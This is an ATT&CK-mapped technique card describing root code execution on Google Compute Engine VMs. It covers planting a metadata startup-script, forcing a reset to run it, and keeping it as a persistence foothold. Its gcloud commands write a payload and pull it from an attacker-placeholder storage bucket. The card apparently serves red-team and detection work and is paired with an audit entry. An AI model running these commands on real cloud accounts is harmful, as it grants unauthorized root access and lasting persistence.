---
id: gcp-gce-startup-script-exec
title: GCE guest code exec via metadata startup-script (control-plane → root)
section: GCP / compute plane
phase: Execution
attack:
  tactic: TA0002
  techniques: [T1651]
platform: [cloud]
source: MITRE ATT&CK T1651; GCE metadata startup-script guest execution
pair: gcp-gce-metadata-audit
---

The control plane is a shell here too. With `compute.instances.setMetadata` (Compute
Instance Admin and up) you write a `startup-script` onto an instance's metadata and
the guest agent runs it as **root** on Linux / **SYSTEM** on Windows — no SSH, no
open port, no OS credential. The catch that separates it from Azure's fire-and-forget
Run Command: the script fires on next boot, so you `reset` the instance to trigger it
(or wait for a natural reboot). Two payload sources log the same but read differently
— `--metadata-from-file startup-script=` puts the script inline in the ARM-equivalent
request, while `--metadata startup-script-url=gs://…` pulls it from a bucket so the
body never carries the code. The metadata key persists until someone clears it, so it
doubles as a re-exec-on-every-boot foothold. (Cloud — no on-host target, so no slots.)

```sh
# write the payload to instance metadata, then force the boot that runs it
gcloud compute instances add-metadata <vm> --zone <zone> \
  --metadata-from-file startup-script=payload.sh
gcloud compute instances reset <vm> --zone <zone>
# …or pull the script from a bucket so it never appears in the request body
gcloud compute instances add-metadata <vm> --zone <zone> \
  --metadata startup-script-url=gs://<attacker-bucket>/payload.sh
```
